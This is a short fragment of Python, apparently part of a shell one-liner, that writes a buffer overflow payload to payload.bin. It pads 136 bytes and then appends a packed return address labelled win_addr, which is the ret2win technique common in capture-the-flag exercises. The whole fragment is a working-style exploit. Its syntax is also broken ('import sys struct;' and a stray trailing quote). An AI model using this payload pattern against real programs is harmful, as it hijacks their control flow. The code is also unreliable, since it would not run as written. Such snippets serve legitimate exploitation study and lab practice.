import sys struct;
offset = 136
win_addr = 0x4012d6

sys.stdout.buffer.write(b"A" * offset + struct.pack("<Q", win_addr))' > payload.bin

